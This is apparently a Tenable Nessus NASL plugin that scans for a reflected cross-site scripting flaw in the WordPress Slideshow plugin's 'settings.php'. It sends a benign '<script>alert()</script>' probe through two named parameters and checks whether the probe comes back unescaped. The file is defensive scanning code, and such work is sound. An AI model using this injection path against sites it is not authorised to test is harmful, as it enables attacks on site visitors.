#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63302);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(56090);
  script_osvdb_id(86782);

  script_name(english:"Slideshow Plugin for WordPress 'settings.php' Multiple Parameter XSS");
  script_summary(english:"Attempts to inject script code via 'settings.php'.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by multiple
cross-site scripting vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of Slideshow Plugin for WordPress installed on the remote
host fails to properly sanitize user-supplied input to the 'settings'
and 'inputFields' parameters of the 'settings.php' script before using
them to generate dynamic HTML output. An attacker can leverage these
issues to inject arbitrary HTML and script code into a user's browser
to be executed within the security context of the affected site.
Successful exploitation of these vulnerabilities requires that PHP's
'register_globals' setting is set to 'on'.

Note that the install is also reportedly affected by an additional
cross-site scripting issue as well as multiple path disclosure
vulnerabilities; however, Nessus has not tested for these issues.");
  script_set_attribute(attribute:"see_also", value:"http://www.waraxe.us/content-92.html");
  # http:/www.wordpress.org/plugins/slideshow-jquery-image-gallery/changelog/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a09e3308");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.1.13 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/10/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/12/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'Slideshow';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "slideshow-jquery-image-gallery/js/SlideshowPlugin/slideshow.js"][0] = make_list('jQuery\\.fn\\.slideshow_script=');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

exploit = FALSE;
xss_test = '<script>alert('+ "'" + SCRIPT_NAME + '-' + unixtime() + "'" + ')</script>';
params = make_list("settings[][group]=", "settings[0][]&inputFields[0]=");

foreach param (params)
{
  url = '/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/settings.php?' + param + urlencode(str:xss_test);
  res = http_send_recv3(
    method       : "GET",
    item         : dir + url,
    port         : port,
    exit_on_fail : TRUE
  );

  if
  (
    "<table>" >< res[2] &&
    (
      "<td>" + xss_test >< res[2] ||
      (xss_test >< res[2] && "<span style" >< res[2])
    )
  )
  {
    exploit = TRUE;
    output = extract_pattern_from_resp(string:res[2], pattern:'ST:'+xss_test);
  }
  # stop after first successful attempt
  if (exploit) break;
}
if (!exploit)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");

if (report_verbosity > 0)
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  report =
    '\nNessus was able to verify the issue exists using the following URL :' +
    '\n' +
    '\n' + install_url + url +
    '\n';
  if (report_verbosity > 1)
  {
    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report +=
      '\n' + 'This produced the following response :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
  security_warning(port:port, extra:report);
}
else security_warning(port);
